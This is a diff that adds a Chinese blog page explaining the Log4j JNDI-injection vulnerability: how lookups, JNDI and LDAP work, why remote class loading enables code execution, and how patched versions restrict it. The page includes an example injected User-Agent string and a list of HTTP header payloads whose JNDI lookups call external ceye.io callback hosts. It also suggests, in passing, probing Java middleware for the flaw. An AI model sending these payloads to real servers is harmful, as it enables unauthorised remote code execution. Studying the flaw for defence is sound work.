@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mosquito.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="log4j漏洞分析及总结参考链接：核弹级漏洞！我把log4j扒给你看！ (qq.com)  log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理 （看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：https:&#x2F;&#x2F;www.wanheiqiyihu.top&#x2F;articles&#x2F;162） log4j漏洞产生">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4j漏洞分析及总结">
+<meta property="og:url" content="http://mosquito.top/2022/12/11/11-12-28/index.html">
+<meta property="og:site_name" content="mosquito的博客">
+<meta property="og:description" content="log4j漏洞分析及总结参考链接：核弹级漏洞！我把log4j扒给你看！ (qq.com)  log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理 （看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：https:&#x2F;&#x2F;www.wanheiqiyihu.top&#x2F;articles&#x2F;162） log4j漏洞产生">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/640.png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/640%20(1).png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/640%20(2).png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/640%20(3).png">
+<meta property="og:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png">
+<meta property="article:published_time" content="2022-12-11T03:12:28.000Z">
+<meta property="article:modified_time" content="2022-12-12T07:48:25.501Z">
+<meta property="article:author" content="mosquito">
+<meta property="article:tag" content="漏洞库">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mosquito.top/imgs/$%7Bfiilename%7D/640.png">
+
+
+<link rel="canonical" href="http://mosquito.top/2022/12/11/11-12-28/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://mosquito.top/2022/12/11/11-12-28/","path":"2022/12/11/11-12-28/","title":"log4j漏洞分析及总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>log4j漏洞分析及总结 | mosquito的博客</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">mosquito的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">log4j漏洞分析及总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">参考链接：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#log4j%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.2.</span> <span class="nav-text">log4j漏洞产生原因</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">原理：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">JNDI协议：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP%E5%8D%8F%E8%AE%AE%EF%BC%9A%EF%BC%88%E7%94%A8%E5%9C%A8%E7%BB%9F%E4%B8%80%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%A2%86%E5%9F%9F%E6%AF%94%E8%BE%83%E5%A4%9A%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">LDAP协议：（用在统一身份认证领域比较多）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%B6%E6%84%8FJNDI%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">恶意JNDI注入攻击：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E4%B8%8E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞验证与复现:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#log4j-payload"><span class="nav-number">3.1.</span> <span class="nav-text">log4j payload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.2.</span> <span class="nav-text">复现:</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="mosquito"
+      src="/images/android-chrome-256x256.png">
+  <p class="site-author-name" itemprop="name">mosquito</p>
+  <div class="site-description" itemprop="description">学海无涯苦作舟</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mosquito.top/2022/12/11/11-12-28/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-256x256.png">
+      <meta itemprop="name" content="mosquito">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mosquito的博客">
+      <meta itemprop="description" content="学海无涯苦作舟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="log4j漏洞分析及总结 | mosquito的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          log4j漏洞分析及总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-12-11 11:12:28" itemprop="dateCreated datePublished" datetime="2022-12-11T11:12:28+08:00">2022-12-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-12-12 15:48:25" itemprop="dateModified" datetime="2022-12-12T15:48:25+08:00">2022-12-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/RCE/" itemprop="url" rel="index"><span itemprop="name">RCE</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
+<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a target="_blank" rel="noopener" href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
+<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
+<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
+<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
+<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
+<p>我们经常会在日志中输出一些变量，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>
+
+<p>现在思考一个问题：</p>
+<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
+<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
+<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
+<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
+<p>log4j2常见的查找途径：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
+<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
+<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
+<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
+<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
+<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
+<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
+<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
+
+<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
+<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
+<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
+<p>进一步解析，发现是JNDI扩展内容。</p>
+<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
+<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
+<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
+<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
+<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
+<blockquote>
+<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
+</blockquote>
+<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
+<p>危险在哪里？</p>
+<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
+<p>这就是鼎鼎大名的JNDI注入攻击！</p>
+<p>其实除了LDAP，还有RMI的方式，</p>
+<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
+<p>JNVDI注入拓展:<a target="_blank" rel="noopener" href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
+<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以及一些变形的payload:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
+<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
+<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
+<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
+<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
+<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
+<p>修复：</p>
+<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%BA%93/" rel="tag"># 漏洞库</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/13/15-34-05/" rel="prev" title="应用服务器glassfish任意文件读取漏洞">
+                  <i class="fa fa-chevron-left"></i> 应用服务器glassfish任意文件读取漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mosquito</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
